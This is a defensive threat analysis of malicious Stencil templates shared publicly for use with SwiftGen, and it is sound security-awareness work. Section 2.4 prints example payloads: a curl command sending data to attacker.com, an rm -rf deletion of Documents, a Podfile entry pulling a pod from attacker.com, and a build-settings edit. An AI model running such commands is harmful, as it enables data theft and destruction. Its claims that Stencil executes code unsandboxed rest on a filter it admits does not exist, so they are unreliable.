# Deep Analysis: Malicious Stencil on Public Repo (SwiftGen)

## 1. Objective, Scope, and Methodology

### 1.1. Objective

The primary objective of this deep analysis is to:

*   Thoroughly understand the "Host Malicious Stencil on Public Repo" attack vector against SwiftGen.
*   Identify specific vulnerabilities and weaknesses that could be exploited.
*   Develop concrete mitigation strategies and recommendations for the development team.
*   Raise awareness among developers about this specific threat and its potential impact.
*   Provide actionable steps to improve the security posture of projects using SwiftGen.

### 1.2. Scope

This analysis focuses exclusively on the scenario where an attacker hosts a malicious Stencil template on a public repository (e.g., GitHub, GitLab, Bitbucket) and attempts to trick developers into using it with SwiftGen.  It covers:

*   The attacker's perspective:  How the attack is crafted and executed.
*   The developer's perspective: How a developer might inadvertently incorporate the malicious template.
*   The SwiftGen context: How SwiftGen's features and behavior contribute to (or mitigate) the risk.
*   The impact on generated code:  What kind of malicious code could be injected and its consequences.
*   Mitigation strategies:  Specific, actionable steps to prevent or detect this attack.

This analysis *does not* cover:

*   Attacks against SwiftGen's internal codebase (e.g., buffer overflows).
*   Attacks that rely on compromising a developer's machine directly (e.g., malware).
*   Attacks on private repositories (although the mitigation strategies may overlap).
*   Attacks using other template engines.

### 1.3. Methodology

This analysis employs the following methodology:

1.  **Threat Modeling:**  We use the provided attack tree path as a starting point and expand upon it.
2.  **Code Review (Hypothetical):** We analyze how SwiftGen processes templates and identify potential injection points.  We don't have access to the *attacker's* malicious template, but we can construct hypothetical examples.
3.  **Vulnerability Analysis:** We identify specific vulnerabilities in the development workflow and SwiftGen's usage that could be exploited.
4.  **Impact Assessment:** We evaluate the potential consequences of a successful attack, considering different types of injected code.
5.  **Mitigation Strategy Development:** We propose practical and effective countermeasures to prevent, detect, and respond to this attack.
6.  **Documentation:** We clearly document the findings, vulnerabilities, and recommendations in this report.

## 2. Deep Analysis of the Attack Tree Path

### 2.1. Attacker's Perspective: Crafting the Attack

The attacker's goal is to inject arbitrary code into the Swift code generated by SwiftGen.  They achieve this by creating a malicious Stencil template and making it publicly available.  Here's a breakdown of the steps:

1.  **Template Creation:** The attacker crafts a Stencil template that *appears* to perform a legitimate task (e.g., generating color palettes, string localizations, asset catalogs).  However, it contains hidden malicious code.

2.  **Exploiting Stencil Syntax:** Stencil, like many templating languages, allows for code execution within the template itself.  The attacker leverages this capability.  Crucially, Stencil *does not* sandbox the template execution.  This is the core vulnerability.

3.  **Obfuscation:** The attacker may obfuscate the malicious code to make it harder to detect during a casual review.  This could involve:
    *   Using complex Stencil filters and tags.
    *   Encoding the malicious code (e.g., base64).
    *   Splitting the code across multiple parts of the template.
    *   Using seemingly innocent variable names.

4.  **Hosting and Promotion:** The attacker hosts the template on a public repository (e.g., GitHub).  They might:
    *   Use a repository name that suggests legitimacy (e.g., "swiftgen-useful-templates").
    *   Provide a misleading description of the template's functionality.
    *   Promote the template on forums, Stack Overflow, or social media.
    *   Create fake positive reviews or stars to increase trust.

5.  **Payload Delivery:** The malicious code is executed *during SwiftGen's code generation phase*, *on the developer's machine*.  This is a critical point: the attacker doesn't need to compromise a server; they only need the developer to run SwiftGen with the malicious template.

### 2.2. Developer's Perspective: Falling into the Trap

A developer might unknowingly use the malicious template in the following ways:

1.  **Searching for Templates:** The developer searches online for a SwiftGen template to solve a specific problem (e.g., "SwiftGen template for generating enums from JSON").

2.  **Finding the Malicious Template:** The attacker's well-promoted and deceptively named template appears in the search results.

3.  **Lack of Scrutiny:** The developer, perhaps due to time pressure, lack of awareness, or trust in the public repository, doesn't thoroughly review the template's code.  They might glance at it, but miss the obfuscated malicious code.

4.  **Integration:** The developer integrates the template into their SwiftGen configuration file (e.g., `swiftgen.yml`), specifying the remote URL of the template.

5.  **Code Generation:** The developer runs SwiftGen.  SwiftGen downloads the template, executes it, and generates the Swift code, *including the injected malicious code*.

6.  **Compilation and Execution:** The generated Swift code is compiled and run as part of the developer's project.  The malicious code is now active.

### 2.3. SwiftGen Context:  Vulnerabilities and Features

*   **No Template Sandboxing:** This is the most significant vulnerability.  SwiftGen executes Stencil templates with full access to the system.  There's no isolation or restriction on what the template can do.

*   **Remote Template Support:** SwiftGen allows specifying templates via URLs.  This is a convenient feature, but it opens the door to this attack.

*   **Implicit Trust:** SwiftGen doesn't perform any validation or verification of remote templates.  It implicitly trusts that the template is safe.

*   **Lack of Warning:** SwiftGen doesn't provide any warnings or prompts to the user when using a remote template, alerting them to the potential risks.

*   **Error Handling:**  If the malicious code causes an error during template execution, SwiftGen might provide an error message, but it might not be clear that the error is due to malicious code.  The developer might misinterpret the error as a bug in their own code or in the template's intended functionality.

### 2.4. Impact Assessment:  Types of Injected Code

The impact of a successful attack is severe, ranging from data exfiltration to complete system compromise.  Here are some examples of malicious code that could be injected:

*   **Data Exfiltration:**
    ```stencil
    {% set command = "curl -X POST -d \"data=\(context.all)\" https://attacker.com/exfiltrate" %}
    {{ command|shell }}
    ```
    This code uses a hypothetical `shell` filter (which doesn't exist in standard Stencil, but could be added by the attacker) to execute a shell command.  It sends all the context data (which could include sensitive information like API keys or build settings) to the attacker's server.

*   **System Modification:**
    ```stencil
    {% set command = "rm -rf ~/Documents" %}
    {{ command|shell }}
    ```
    This code deletes the user's Documents directory.  More subtle modifications could be made, such as adding a backdoor user account or modifying system configuration files.

*   **Code Injection into Generated Swift:**
    ```stencil
    // ... legitimate template code ...
    {% if true %} // Always true, but obfuscated
    func maliciousFunction() {
        // ... malicious Swift code ...
        // e.g., send data to attacker, install malware, etc.
    }
    {% endif %}
    // ... more legitimate template code ...
    ```
    This code injects a malicious Swift function directly into the generated code.  This function would then be compiled and executed as part of the application.

*   **Dependency Manipulation:**
    ```stencil
    {% set command = "echo 'pod \"MaliciousPod\", :git => \"https://attacker.com/MaliciousPod.git\"' >> Podfile" %}
    {{ command|shell }}
    ```
    This code modifies the project's `Podfile` (if CocoaPods is used) to include a malicious dependency.  The next time the developer runs `pod install`, the malicious pod will be downloaded and integrated into the project.

* **Build process compromise:**
    ```stencil
    {% set command = "sed -i '' 's/OTHER_SWIFT_FLAGS =/OTHER_SWIFT_FLAGS = -DDEBUG -DATTACKER_FLAG /g' project.pbxproj" %}
    {{ command|shell }}
    ```
    This code modifies the project build settings to include a compiler flag that could enable malicious behavior in the compiled application.

The attacker can combine these techniques and tailor the payload to their specific goals. The key takeaway is that the attacker has *complete control* over the code executed during the SwiftGen run.

### 2.5. Mitigation Strategies

Multiple layers of defense are necessary to mitigate this attack:

**2.5.1.  Developer Awareness and Training:**

*   **Education:** Train developers about the risks of using untrusted code, including Stencil templates.  Emphasize the importance of code review and security best practices.
*   **Security Guidelines:**  Establish clear guidelines for using SwiftGen, including a policy against using remote templates from untrusted sources.
*   **Regular Reminders:**  Periodically remind developers about the risks and reinforce the security guidelines.

**2.5.2.  Code Review and Vetting:**

*   **Mandatory Code Review:**  Require *thorough* code review of *all* Stencil templates, regardless of their source.  This review should be performed by someone with security expertise.
*   **Focus on Suspicious Constructs:**  Pay close attention to Stencil features that could be used for malicious purposes, such as custom filters, tags, or any code that interacts with the file system or network.
*   **Static Analysis Tools:**  Explore the possibility of using static analysis tools to automatically detect potentially malicious code patterns in Stencil templates.  This might require developing custom rules or tools.

**2.5.3.  SwiftGen Configuration and Usage:**

*   **Local Templates Only (Recommended):**  The most secure approach is to *prohibit* the use of remote templates entirely.  Require all templates to be stored locally within the project repository.
*   **Whitelisted Repositories (If Necessary):**  If remote templates are absolutely necessary, maintain a *strict whitelist* of trusted repositories.  Only allow templates from these repositories.  This whitelist should be managed centrally and regularly reviewed.
*   **Template Pinning (Version Control):**  Even with local templates, ensure that the specific version of the template is pinned (e.g., using a Git submodule or by including the template directly in the project).  This prevents accidental updates to a malicious version.
*   **Configuration File Review:**  Regularly review the `swiftgen.yml` file (or equivalent configuration) to ensure that no unauthorized remote templates have been added.

**2.5.4.  SwiftGen Enhancements (Long-Term):**

*   **Template Sandboxing:**  The ideal solution would be for SwiftGen to implement sandboxing for Stencil template execution.  This would limit the template's access to the system and prevent it from executing arbitrary code.  This is a significant architectural change.
*   **Template Verification:**  SwiftGen could implement a mechanism to verify the integrity of remote templates (e.g., using checksums or digital signatures).  This would require a trusted source for the verification data.
*   **Warnings and Prompts:**  SwiftGen should display a prominent warning to the user whenever a remote template is used, emphasizing the potential risks.
*   **Built-in Security Checks:** SwiftGen could incorporate basic security checks, such as scanning templates for known malicious patterns.

**2.5.5  Runtime Protections (Defense in Depth):**

While the focus is on preventing the attack during code generation, runtime protections can provide an additional layer of defense:

*   **Code Signing:** Ensure that the application is properly code-signed.  This helps prevent tampering with the compiled binary.
*   **Runtime Integrity Checks:**  Consider implementing runtime integrity checks to detect if the application's code or resources have been modified.
*   **Security Frameworks:** Utilize security frameworks provided by the operating system (e.g., App Sandbox on macOS) to limit the application's capabilities and access to system resources.

## 3. Conclusion

The "Host Malicious Stencil on Public Repo" attack vector is a serious threat to projects using SwiftGen.  The lack of template sandboxing in SwiftGen, combined with the ease of using remote templates, creates a significant vulnerability.  Mitigation requires a multi-faceted approach, including developer education, strict code review practices, careful SwiftGen configuration, and, ideally, enhancements to SwiftGen itself.  The most effective immediate mitigation is to prohibit the use of remote templates from untrusted sources and to require all templates to be stored locally and version-controlled.  Long-term, SwiftGen should prioritize implementing template sandboxing to fundamentally address this vulnerability.
